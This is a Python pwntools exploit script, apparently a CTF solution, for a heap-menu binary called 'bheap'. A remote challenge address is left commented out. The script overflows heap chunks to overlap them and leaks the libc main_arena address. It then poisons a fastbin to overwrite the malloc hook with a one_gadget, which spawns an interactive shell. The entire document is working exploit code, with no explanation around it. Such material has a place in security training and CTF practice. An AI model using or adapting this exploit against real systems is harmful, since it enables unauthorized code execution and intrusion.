# -*- coding: utf-8 -*-
from pwn import *
context.log_level = 'debug'
context.terminal = ['deepin-terminal', '-x', 'sh' ,'-c']
name = './bheap'
elf = ELF(name)
p = process(name)
#p = remote("111.198.29.45",30617)
if args.G:
    gdb.attach(p)

def alloc(s):
    p.recvuntil("Command: ")
    p.sendline("1")
    p.recvuntil("Size: ")
    p.sendline(str(s))

def fill(i,s,data):
    p.recvuntil("Command: ")
    p.sendline("2")
    p.recvuntil("Index: ")
    p.sendline(str(i))
    p.recvuntil("Size: ")
    p.sendline(str(s))
    p.recvuntil("Content: ")
    p.sendline(data)

def free(i):
    p.recvuntil("Command: ")
    p.sendline("3")
    p.recvuntil("Index: ")
    p.sendline(str(i))

def dump(i):
    p.recvuntil("Command: ")
    p.sendline("4")
    p.recvuntil("Index: ")
    p.sendline(str(i))

alloc(10) # 0
alloc(10) # 1
alloc(10) # 2
alloc(10) # 3
alloc(10) # 4
alloc(0x80) # 5 

free(1)
free(3)
payload = 'a'*24 + p64(0x21) + p8(0xa0)
fill(2,len(payload),payload)

payload = 'a'*24 + p64(0x21)
fill(4,len(payload),payload)
alloc(10) # 1
alloc(10) # 3 5

payload = 'a'*24 + p64(0x91)

fill(4,len(payload),payload)
alloc(0x80) # 6
free(5)
dump(3)

p.recvuntil("Content: \n")
main_arena = u64(p.recv(6) + '\x00\x00') - 0x58
success("main_arena: " + hex(main_arena))

alloc(0x60) # 5
free(5)
payload = p64(main_arena-0x33)
fill(3,len(payload),payload)
alloc(0x60) # 5
alloc(0x60) # 6

one_gadget = main_arena - 0x399b00 +  0x3f35a
payload = '|/bin/sh;' + 'a'*10 + p64(one_gadget)
fill(7,len(payload),payload)
alloc(0x20)
p.interactive()
